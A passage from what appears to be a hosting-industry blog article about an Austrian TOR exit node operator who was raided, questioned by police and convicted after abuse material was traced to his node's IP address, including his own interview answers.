judge that I sold them, but I believe that even in that case, it will most likely just be a fine and a probation due to the amount (approximately 4 grams of pure THC in total, I’d guess). The drugs are the least of my concerns right now.</p><p><strong>Have you been in contact with the LKA? Have they contacted you since? Do you have any information from the lawyer, or any idea what’s going to happen next?</strong></p><p>At 13:30, I showed up as appointed, at the LKAs Graz office. They let me wait outside for 20 minutes before someone finally escorted me to the officer in charge. Again, I was not immediately informed of my rights at this time.</p><p>I was handed two copies of the search warrant, with a list of confiscated items – one of them for my hardware, the other one for my guns and the drugs – which I agreed to sign. It was only at this time that I was informed of my right to consult a lawyer or to not say anything at all. I declined, as I had already gotten into contact with a lawyer before that. I, once again, told them where my firearms were purchased and that they were legal, and that the confiscated drugs were only for my personal use. I again declined to answer questions regarding the source of the drugs.</p><p>After this, I had them show me the offending IP address, which I identified as belonging to me in the specified timeframe. I explained that this was a TOR exit node under my control at this time. I attempted to explain what TOR is, and they appeared to be familiar with it, as the atmosphere suddenly became more friendly. They probably understood that it was very unlikely they had a child pornographer sitting in their office.</p><p>Some questions about my motives followed, which I attempted to answer – but this seemingly failed. I could not make them understand why I would “waste” resources and bandwidth (translating into money) to run a TOR node. I informed them that I was already contacted by the Polish police in May about this IP, regarding hacking attempts originating from it. Back then I had already explained to Polish police that this was a TOR exit node, and that no logfiles were held. After the report of hacking attempts, I shut down the TOR node on this server, but apparently this was too late and they were investigating (and/or wiretapping) already.</p><p>I was handed the interrogation transcript, which I agreed to sign after reading it. I was free to go, but again they failed to inform me of something of critical importance – that I was not allowed to leave the country without consent of police. I was informed of this by my boss later. This was quite a surprise and very annoying, as my family and girlfriend live in Slovenia, and I frequently visit them on weekends which is now much harder if not impossible in the next months.</p></blockquote><h3>The Raid Aftermath</h3><p>After William is raided and accused of distributing and/or producing child pornography… they don’t arrest him.</p><p>They then spend years trying to build a case and it results in a conviction of “supporting the transfer of underage pornography.”</p><p>It was at this point in researching the case I realized almost all of the different sources I was using contained inaccurate information or broken links.</p><p>He hadn’t been active over on LowEndTalk in a while, so, I decided to reach out to William directly on Telegram for answers to a couple of questions…</p><p>Luckily, he got back to me almost immediately:</p><p><strong>Did you accept a plea deal or take it to court?</strong></p><p><em>The Austrian legal system has no plea deals. I was charged and convicted with the support, not the ownership. There is ownership, sale, distribution for no monetary gain, and support of general distribution. The last is what I got and the lowest of all.</em></p><p><strong>But you were found guilty of that and given probation, though?</strong></p><p><em>Yes, as they had to give me the minimum sentence. By law they were right as the law only protected registered companies, unlike in Germany for example. The law was changed a few weeks later to include private persons and sole traders as protected lsps, not just companies, but they had to convict me. No choice in the end.</em></p><p><strong>What was the sentence?</strong></p><p><em>I received 5 years probation instead of a 3-month jail sentence, but I left Austria shortly after sentencing.&nbsp; There was no probation officer or anything similar. They let me leave without putting in an Inter or Europol warrant to return me. The probation was just on paper in the end.</em></p><p><strong>I noticed they mentioned “logs” of you talking about hosting CP, can you elaborate?</strong></p><p><em>They took a bunch of IRC logs where I stated what I can and can’t host at a web hosting provider I owned. The logs do exist but are taken out of context.&nbsp;</em></p><p><strong>Why did they originally want to raid you? Did you know or was it random?</strong></p><p><em>I rented a server in Poland and someone uploaded CP to an Austrian image hoster. They reported it to the Austrian police, which contacted the ISP, which gave them my WHMCS login IP and then subpoenaed UPC Austria for my address, then queried the weapons registry.</em></p><div id="attachment_38552"><p><img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1MDAiIGhlaWdodD0iNTUwIiB2aWV3Qm94PSIwIDAgNTAwIDU1MCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iI2NmZDRkYiIvPjwvc3ZnPg==" aria-describedby="caption-attachment-38552" decoding="async" data-src="https://lowendbox.com/wp-content/uploads/2023/07/william2.jpg" alt="" width="500" height="550" data-srcset="https://lowendbox.com/wp-content/uploads/2023/07/william2.jpg 872w, https://lowendbox.com/wp-content/uploads/2023/07/william2-273x300.jpg 273w, https://lowendbox.com/wp-content/uploads/2023/07/william2-768x846.jpg 768w" data-sizes="(max-width: 500px) 100vw, 500px"></p><p id="caption-attachment-38552">(William is pictured with an AK-74, ammo is 7.62mm not 5.45mm.)</p></div><p><em>It didn’t go to the cybercrime unit, but child abuse.
